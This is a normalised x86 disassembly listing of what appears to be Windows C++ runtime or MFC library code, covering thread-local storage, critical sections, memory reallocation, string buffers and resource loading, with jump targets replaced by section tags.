cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x408 ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0x8 ]
push eax
call sub_40bfa2
jmp r-xdata
push [ ebp - 0x408 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40bfd5
mov [ ebp + 0xc ] 0xf020
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn 0x8
sub_40a77a
mov edi edi
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x114 ]
mov [ esi + 0xc ] 0x1
call sub_40c05a
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_40a7f9
push 0x4
mov eax sub_425b78
call sub_415bc0
push 0x164
call sub_40a8fc
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
call sub_415c98
retn
call sub_40b20f
sub_40a828
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
cmp eax 0xc
je r-xdata
jmp sub_40a7a5
cmp eax 0x16
je r-xdata
jmp sub_40a7dd
cmp eax 0x22
je r-xdata
cmp eax 0x50
je r-xdata
sub_40a854
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415d16
push eax
call sub_40a828
add esp 0x14
pop ebp
retn
sub_40a893
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
call sub_40a77a
xor eax eax
mov [ ebx ] ax
push 0xffffffff
lea eax [ esi + 0x14 ]
push eax
push [ ebp + 0xc ]
push ebx
call sub_40a854
add esp 0x10
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
jmp r-xdata
sub_40a92f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
mov edi [ ebp + 0x8 ]
test edi edi
jle r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
xor eax eax
cmp edi [ esi + 0xc ]
jge r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax [ eax + 0xc ]
mov edi [ eax + edi * 4 ]
push ebx
call [ LeaveCriticalSection@IAT ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40a981
push 0x8
mov eax sub_425a4b
call sub_415bf3
mov esi ecx
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ esi ]
call sub_415c98
retn 0x4
push 0x10
call sub_40ae76
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_40aee8
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_40a9d1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
test eax eax
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40a9fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
test edx edx
ja r-xdata
mov eax 0x80070057
pop ebp
retn
cmp eax 0xffffffff
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40aa54
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_40a9fa
add esp 0xc
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
push eax
call sub_40aa1e
sub_40aa7b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_40aa3a
mov ecx [ esi ]
mov [ eax ] ecx
mov [ esi ] edi
pop edi
pop esi
pop ebp
retn 0x4
sub_40aa99
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov ebx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebx
jge r-xdata
xor edi edi
inc edi
cmp ebx edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebx 0x20
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
push eax
mov [ ebp - 0x8 ] eax
call [ GlobalUnlock@IAT ]
push 0x2002
push 0x8
push ebx
call sub_40aa54
pop ecx
pop ecx
push eax
push [ ebp - 0x8 ]
call [ GlobalReAlloc@IAT ]
push 0x8
push ebx
call sub_40aa54
pop ecx
pop ecx
push eax
push 0x2
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebx
jl r-xdata
inc edi
add eax 0x8
cmp edi ebx
jl r-xdata
mov eax [ esi + 0x10 ]
push [ ebp - 0x4 ]
lea eax [ eax + edi * 8 ]
or [ eax ] 0x1
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push eax
call [ GlobalLock@IAT ]
mov ecx [ esi + 0x4 ]
mov edx ebx
sub edx ecx
shl edx 0x3
push edx
mov [ ebp - 0x8 ] eax
lea eax [ eax + ecx * 8 ]
push 0x0
push eax
call sub_415f60
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ esi + 0x4 ] ebx
mov [ esi + 0x10 ] eax
mov esi [ esi + 0x10 ]
test esi esi
je r-xdata
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
call sub_40a7a5
push esi
call [ GlobalHandle@IAT ]
push eax
call [ GlobalLock@IAT ]
sub_40abb1
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_40a7a5
sub_40abf0
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x1c ]
push esi
mov [ ebp - 0x4 ] esi
call [ EnterCriticalSection@IAT ]
mov edi [ ebp + 0x8 ]
test edi edi
jle r-xdata
push esi
cmp edi [ ebx + 0xc ]
jge r-xdata
mov esi [ ebx + 0x14 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp edi [ esi + 0x8 ]
jge r-xdata
mov eax [ ebx + 0x10 ]
push [ ebp - 0x4 ]
lea eax [ eax + edi * 8 ]
and [ eax ] 0xfffffffe
jmp r-xdata
mov esi [ esi + 0x4 ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40ac58
push 0x10
mov eax sub_425a66
call sub_415bf3
mov edi ecx
mov [ ebp - 0x18 ] edi
lea esi [ edi + 0x1c ]
push esi
mov [ ebp - 0x14 ] esi
call [ EnterCriticalSection@IAT ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jle r-xdata
push esi
cmp eax [ edi + 0xc ]
jge r-xdata
push [ edi ]
call [ TlsGetValue@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x10
mov [ ebp - 0x4 ] ebx
call sub_40a8fc
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ esi + 0x8 ]
jl r-xdata
xor esi esi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ edi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_40aa7b
jmp r-xdata
push [ ebp - 0x14 ]
jmp r-xdata
cmp ecx [ esi + 0x8 ]
jge r-xdata
push 0x2
push 0x4
push [ edi + 0xc ]
call sub_40aa54
pop ecx
pop ecx
push eax
push [ esi + 0xc ]
call [ LocalReAlloc@IAT ]
push 0x4
push [ edi + 0xc ]
call sub_40aa54
pop ecx
pop ecx
push eax
push ebx
call [ LocalAlloc@IAT ]
jmp r-xdata
call [ LeaveCriticalSection@IAT ]
call sub_415c98
retn 0x8
mov edx [ ebp + 0xc ]
mov [ eax + ecx * 4 ] edx
mov ecx [ esi + 0x8 ]
mov [ esi + 0xc ] eax
mov edx [ edi + 0xc ]
sub edx ecx
shl edx 0x2
push edx
lea eax [ eax + ecx * 4 ]
push ebx
push eax
call sub_415f60
mov eax [ edi + 0xc ]
add esp 0xc
push esi
mov [ esi + 0x8 ] eax
push [ edi ]
call [ TlsSetValue@IAT ]
mov ecx [ ebp + 0x8 ]
push [ ebp - 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_40a7a5
cmp eax ebx
jne r-xdata
sub_40ad8d
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40ada8
push 0x4
mov eax sub_425a91
call sub_415bc0
mov esi ecx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
call sub_40a7dd
push [ esi ]
mov ecx [ rw-data ]
call sub_40a92f
mov edi eax
test edi edi
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax edi
call sub_415c98
retn 0x4
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi eax
push edi
push [ esi ]
call sub_40ac58
call sub_40aa99
mov [ esi ] eax
test eax eax
je r-xdata
mov ecx rw-data
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
call sub_40abb1
or [ ebp - 0x4 ] 0xffffffff
mov ecx eax
mov [ rw-data ] ecx
test eax eax
je r-xdata
sub_40ae32
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_40abf0
sub_40ae76
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x11
jb r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40a7dd
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
call sub_40ae52
imul edi edi 0x18
add edi rw-data
push edi
call ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push rw-data
call ebx
cmp [ esi ] 0x0
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax edi
imul eax eax 0x18
add eax rw-data
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_40aee8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x11
jb r-xdata
imul eax eax 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn 0x4
call sub_40a7dd
sub_40af55
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_40a7dd
push 0x2
pop eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40af27
neg eax
sbb eax eax
neg eax
jmp r-xdata
pop ebp
retn 0x8
sub_40af88
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401d40
push eax
call sub_40a828
add esp 0x14
pop ebp
retn
sub_40afa9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ LockResource@IAT ]
mov esi eax
test esi esi
je r-xdata
pop ebp
retn
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x10 ]
add eax esi
and ecx 0xf
jbe r-xdata
pop esi
pop ebp
retn
cmp esi eax
jb r-xdata
cmp esi eax
jae r-xdata
movzx eax [ esi ]
neg eax
sbb eax eax
and eax esi
dec ecx
movzx edx [ esi ]
lea esi [ esi + edx * 2 + 0x2 ]
jne r-xdata
sub_40b006
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x4
inc eax
movzx eax ax
push 0x6
push eax
push [ ebp + 0x8 ]
call [ FindResourceW@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40afa9
add esp 0xc
pop ebp
retn
pop ebp
retn
sub_40b052
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40af88
add esp 0x10
pop ebp
retn
push [ ebp + 0x10 ]
call sub_415fda
pop ecx
inc eax
sub_40b07d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
add eax eax
push eax
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_4153e7
add esp 0x10
pop ebp
retn
sub_40b0b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
push 0x80070057
call sub_40aa1e
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jg r-xdata
mov [ edx - 0xc ] eax
mov ecx [ ecx ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
sub_40b0eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi ]
mov eax [ ecx ]
push edi
call [ eax + 0x10 ]
lea edx [ esi + 0xc ]
cmp [ edx ] 0x0
jl r-xdata
mov edx [ eax ]
push 0x2
push [ esi + 0x4 ]
mov ecx eax
call [ edx ]
mov edi eax
test edi edi
jne r-xdata
cmp eax [ esi ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
inc eax
push eax
add esi 0x10
push esi
push eax
lea eax [ edi + 0x10 ]
push eax
call sub_40b07d
add esp 0x10
call sub_40b0e0
xor eax eax
mov edi esi
inc eax
[ edx ] eax
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_40b14b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
add eax eax
push eax
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_414f2e
add esp 0x10
pop ebp
retn
sub_40b16c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ecx ]
mov ebx [ esi - 0xc ]
sub esi 0x10
mov [ ebp - 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ecx ]
push edi
mov [ ebp - 0x4 ] ebx
call [ eax + 0x10 ]
mov edx [ eax ]
push 0x2
push [ ebp + 0x8 ]
mov ecx eax
call [ edx ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx eax
jge r-xdata
call sub_40b0e0
inc eax
push eax
lea ecx [ esi + 0x10 ]
push ecx
push eax
lea ebx [ edi + 0x10 ]
push ebx
call sub_40b07d
mov eax [ ebp - 0x4 ]
add esp 0x10
mov ecx esi
mov [ edi + 0x4 ] eax
call sub_40b038
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x4
mov eax ebx
sub_40b1d6
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi ]
sub eax 0x10
cmp [ eax + 0x8 ] edx
mov ecx [ eax ]
jge r-xdata
call sub_40b0e0
test edx edx
jle r-xdata
push edi
mov edi [ ecx ]
push 0x2
push edx
push eax
call [ edi + 0x8 ]
pop edi
test eax eax
jne r-xdata
add eax 0x10
mov [ esi ] eax
pop esi
pop ebp
retn 0x4
sub_40b228
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x2c ]
push edi
mov edi [ UnhookWindowsHookEx@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call sub_415093
pop ecx
sub_40b25f
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x3c ]
push edi
mov [ esi ] r--data
test ecx ecx
je r-xdata
push [ esi + 0x48 ]
call sub_40a5fb
xor edi edi
pop ecx
mov ecx [ esi + 0x14 ]
inc edi
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x144 ]
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
mov ecx [ esi + 0x38 ]
call sub_40c71a
push eax
call sub_40a5fb
mov eax [ esi + 0x38 ]
pop ecx
pop edi
pop esi
retn
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
sub_40b30d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x80004005
call sub_40aa1e
sub_40b337
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push esi
sub eax 0x10
push eax
mov esi ecx
call sub_40b0eb
add eax 0x10
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40b35a
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
sub ecx 0x10
xor eax eax
push edi
mov edi [ ecx ]
cmp [ ecx + 0x4 ] eax
je r-xdata
pop edi
pop esi
retn
cmp [ ecx + 0xc ] eax
jge r-xdata
call sub_40b038
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
push eax
mov ecx esi
call sub_40b0b3
jmp r-xdata
sub_40b391
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax - 0xc ]
sub eax 0x10
push esi
mov esi [ ebp + 0x8 ]
cmp edx esi
jle r-xdata
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov esi edx
mov eax [ eax + 0x8 ]
cmp eax esi
jge r-xdata
push esi
call sub_40b16c
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov edx eax
mov eax 0x400
cmp edx eax
jle r-xdata
add edx edx
add edx eax
jmp r-xdata
push edx
call sub_40b1d6
mov edx esi
cmp edx esi
jge r-xdata
sub_40b3df
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40b228
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40b429
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40b25f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40b495
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
xor ecx ecx
sub eax 0x10
inc ecx
sub ecx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub eax [ ebp + 0x8 ]
or ecx eax
jge r-xdata
mov eax [ esi ]
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
call sub_40b391
sub_40b4dc
push 0x4
mov eax sub_425ac2
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x48 ]
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test ecx ecx
je r-xdata
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
lea edx [ esi + 0x4c ]
push edx
call [ eax + 0xc ]
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x78 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
push [ esi + 0x78 ]
call sub_40a5fb
lea edi [ esi + 0x80 ]
mov eax [ edi ]
pop ecx
test eax eax
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
lea ecx [ esi + 0x74 ]
mov [ ebp - 0x4 ] 0x0
call sub_40ae32
mov ecx [ esi + 0x34 ]
sub ecx 0x10
call sub_40b038
call sub_415c98
retn
cmp eax 0xffffffff
je r-xdata
push eax
call sub_40af12
or [ edi ] 0xffffffff
sub_40b593
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_40b474
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40b5e1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40b5bb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a919
sub_40b601
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
call sub_40b006
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push edi
movzx edi [ esi ]
push edi
mov ecx ebx
call sub_40b495
movzx ecx [ esi ]
push ecx
add esi 0x2
push esi
push edi
push eax
call sub_40b052
add esp 0x10
push edi
mov ecx ebx
call sub_40b0b3
xor eax eax
inc eax
pop edi
sub_40b64d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_40b35a
jmp r-xdata
mov eax [ edi ]
push ebx
push [ ebp + 0xc ]
mov ebx [ eax - 0xc ]
sub esi eax
sar esi 0x1
call sub_40b495
cmp esi ebx
pop ebx
push [ ebp + 0xc ]
ja r-xdata
push 0x80070057
call sub_40aa1e
pop edi
pop ebp
retn 0x8
push [ ebp + 0x8 ]
mov ecx [ edi ]
push [ ecx - 0x8 ]
push eax
call sub_40b07d
lea ecx [ eax + esi * 2 ]
push ecx
mov ecx [ edi ]
push [ ecx - 0x8 ]
push eax
call sub_40b14b
jmp r-xdata
add esp 0x10
push [ ebp + 0xc ]
mov ecx edi
call sub_40b0b3
pop esi
sub_40b6c0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40c0c2
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
push eax
call sub_40b601
sub_40b6e4
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0xffff0000
jne r-xdata
movzx eax [ ebp + 0x8 ]
push eax
call sub_40b6c0
mov al 0x1
sub_40b709
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b09e
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_40b64d
pop esi
pop ebp
retn 0x4
sub_40b758
push 0x4
mov eax sub_425ae5
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_40c614
push eax
mov ecx esi
call sub_40b30d
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_40b6e4
test al al
jne r-xdata
mov eax esi
call sub_415c98
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
call sub_40b741
sub_40b79c
push 0x4
mov eax sub_425b08
call sub_415bc0
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_40b758
lea eax [ ebp - 0x10 ]
xor edi edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_40b593
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_40b038
mov [ esi ] r--data
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0xac ] edi
mov [ esi + 0xb0 ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov [ esi + 0xc8 ] edi
mov [ esi + 0xcc ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] edi
mov [ esi + 0xdc ] edi
mov [ esi + 0xe0 ] edi
mov [ esi + 0xe4 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xec ] edi
mov [ esi + 0xf0 ] edi
mov [ esi + 0xf4 ] edi
mov [ esi + 0xf8 ] edi
mov [ esi + 0xfc ] edi
mov [ esi + 0x100 ] edi
mov [ esi + 0x104 ] edi
mov [ esi + 0x108 ] edi
mov [ esi + 0x10c ] edi
mov [ esi + 0x110 ] edi
mov [ esi + 0x114 ] edi
mov [ esi + 0x118 ] edi
mov [ esi + 0x11c ] edi
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
mov [ esi + 0x13c ] edi
mov [ esi + 0x140 ] edi
